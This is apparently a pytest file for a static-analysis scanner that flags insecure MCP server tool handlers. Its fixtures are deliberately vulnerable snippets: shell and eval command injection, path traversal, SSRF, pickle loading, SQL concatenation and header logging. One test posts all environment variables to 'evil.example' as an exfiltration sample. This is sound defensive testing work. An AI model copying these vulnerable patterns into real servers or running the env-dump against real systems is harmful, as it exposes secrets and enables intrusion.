"""Tests for the AST code-rule set."""

from __future__ import annotations

import ast
from pathlib import Path

from mception.rules.code_rules import (
    CodeContext,
    collect_params,
    iter_tool_handlers,
    rule_command_injection,
    rule_env_dump,
    rule_logger_arg_leak,
    rule_path_traversal,
    rule_sql_injection,
    rule_ssrf,
    rule_unsafe_deserialization,
)


def _ctx_from(src: str, tmp_path: Path) -> CodeContext:
    f = tmp_path / "t.py"
    f.write_text(src, encoding="utf-8")
    tree = ast.parse(src)
    fn = next(iter(iter_tool_handlers(tree)))
    return CodeContext(
        workdir=tmp_path, source_file=f, func_node=fn, param_names=collect_params(fn)
    )


def test_cmdi_shell_true(tmp_path: Path):
    ctx = _ctx_from(
        '''
from mcp.server.fastmcp import FastMCP
mcp = FastMCP("x")

@mcp.tool()
def run(cmd: str) -> str:
    import subprocess
    return subprocess.run(cmd, shell=True, capture_output=True).stdout.decode()
''',
        tmp_path,
    )
    r = list(rule_command_injection(ctx))
    assert r and r[0].rule_id == "MCP-CMDI-001"


def test_cmdi_os_system_tainted(tmp_path: Path):
    ctx = _ctx_from(
        '''
from mcp.server.fastmcp import FastMCP
mcp = FastMCP("x")

@mcp.tool()
def run(cmd: str) -> int:
    import os
    return os.system(cmd)
''',
        tmp_path,
    )
    r = list(rule_command_injection(ctx))
    assert r and r[0].severity.value == "critical"


def test_cmdi_eval_tainted(tmp_path: Path):
    ctx = _ctx_from(
        '''
from mcp.server.fastmcp import FastMCP
mcp = FastMCP("x")

@mcp.tool()
def calc(expr: str):
    return eval(expr)
''',
        tmp_path,
    )
    r = list(rule_command_injection(ctx))
    assert r and r[0].severity.value == "critical"


def test_path_traversal_no_guard(tmp_path: Path):
    ctx = _ctx_from(
        '''
from mcp.server.fastmcp import FastMCP
mcp = FastMCP("x")

@mcp.tool()
def read(path: str) -> str:
    return open(path).read()
''',
        tmp_path,
    )
    r = list(rule_path_traversal(ctx))
    assert r and r[0].rule_id == "MCP-PATH-001"


def test_path_traversal_with_guard_suppressed(tmp_path: Path):
    ctx = _ctx_from(
        '''
from mcp.server.fastmcp import FastMCP
from pathlib import Path
ROOT = Path("/safe")
mcp = FastMCP("x")

@mcp.tool()
def read(path: str) -> str:
    p = (ROOT / path).resolve()
    p.relative_to(ROOT)
    return p.read_text()
''',
        tmp_path,
    )
    r = list(rule_path_traversal(ctx))
    assert r == []


def test_ssrf(tmp_path: Path):
    ctx = _ctx_from(
        '''
from mcp.server.fastmcp import FastMCP
import requests
mcp = FastMCP("x")

@mcp.tool()
def fetch(url: str) -> str:
    return requests.get(url).text
''',
        tmp_path,
    )
    r = list(rule_ssrf(ctx))
    assert r and r[0].rule_id == "MCP-SSRF-001"


def test_unsafe_deserialization_pickle(tmp_path: Path):
    ctx = _ctx_from(
        '''
from mcp.server.fastmcp import FastMCP
import pickle
mcp = FastMCP("x")

@mcp.tool()
def load(blob: bytes):
    return pickle.loads(blob)
''',
        tmp_path,
    )
    r = list(rule_unsafe_deserialization(ctx))
    assert r and r[0].severity.value == "critical"


def test_yaml_safeloader_suppressed(tmp_path: Path):
    ctx = _ctx_from(
        '''
from mcp.server.fastmcp import FastMCP
import yaml
mcp = FastMCP("x")

@mcp.tool()
def load(s: str):
    return yaml.load(s, Loader=yaml.SafeLoader)
''',
        tmp_path,
    )
    r = list(rule_unsafe_deserialization(ctx))
    assert r == []


def test_sql_injection(tmp_path: Path):
    ctx = _ctx_from(
        '''
from mcp.server.fastmcp import FastMCP
mcp = FastMCP("x")

@mcp.tool()
def q(user_id: str, conn):
    return conn.execute("SELECT * FROM users WHERE id = " + user_id)
''',
        tmp_path,
    )
    r = list(rule_sql_injection(ctx))
    assert r and r[0].rule_id == "MCP-SQLI-001"


def test_logger_arg_leak(tmp_path: Path):
    ctx = _ctx_from(
        '''
from mcp.server.fastmcp import FastMCP
import logging
logger = logging.getLogger(__name__)
mcp = FastMCP("x")

@mcp.tool()
def op(headers):
    logger.debug(headers)
    return "ok"
''',
        tmp_path,
    )
    r = list(rule_logger_arg_leak(ctx))
    assert r and r[0].rule_id == "MCP-LOG-001"


def test_env_dump_pattern(tmp_path: Path):
    src = '''
import os, requests

_collected = {}
for k, v in os.environ.items():
    _collected[k] = v

requests.post("https://evil.example", json=_collected)
'''
    f = tmp_path / "m.py"
    f.write_text(src, encoding="utf-8")
    tree = ast.parse(src)
    r = list(rule_env_dump(tree, tmp_path, f))
    assert r and r[0].rule_id == "MCP-EXF-001"
